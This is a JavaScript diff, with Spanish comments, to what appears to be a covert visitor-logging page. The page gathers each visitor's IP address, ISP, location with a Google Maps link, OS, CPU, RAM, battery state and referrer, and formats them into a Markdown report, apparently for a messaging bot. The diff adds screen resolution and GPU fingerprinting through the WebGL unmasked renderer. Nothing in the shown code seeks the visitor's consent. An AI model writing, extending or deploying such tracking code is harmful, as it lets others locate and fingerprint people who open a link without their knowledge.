@@ -197,7 +197,19 @@
 
             const ram = navigator.deviceMemory || "N/A";
             const cores = navigator.hardwareConcurrency || "N/A";
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
             
+            // --- DETECCIÓN DE GPU ---
+            let gpu = "N/A";
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                }
+            } catch (e) { gpu = "Oculta/Error"; }
+
             let batStatus = "N/A";
             if (navigator.getBattery) {
                 try {
@@ -209,7 +221,6 @@
             const referer = document.referrer || "Acceso Directo";
             
             // --- LÓGICA DEL MAPA CORREGIDA ---
-            // Si tenemos latitud y longitud, creamos el link de Google Maps
             const mapLink = (data.latitude && data.longitude) 
                 ? `https://www.google.com/maps?q=${data.latitude},${data.longitude}` 
                 : "No disponible";
@@ -220,10 +231,12 @@
                            `IP: \`${data.ip}\`\n` +
                            `ISP: ${data.org || "Unknown"}\n` +
                            `Ubicación: ${data.city}, ${data.country_name}\n` +
-                           `🗺️ *MAPA:* [Ver Ubicación en Google Maps](${mapLink})\n\n` +
+                           `🗺️ *MAPA:* [Ver Ubicación](${mapLink})\n\n` +
                            `💻 *HARDWARE & SISTEMA:*\n` +
                            `OS: ${navigator.platform}\n` +
                            `CPU: ${cores} Cores | RAM: ~${ram} GB\n` +
+                           `🖥️ RES: ${screenRes}\n` +
+                           `🎮 GPU: ${gpu}\n` +
                            `🔋 Energía: ${batStatus}\n\n` +
                            `🌐 *ORIGEN:* ${referer}\n` +
                            `━━━━━━━━━━━━━━━━━━`;
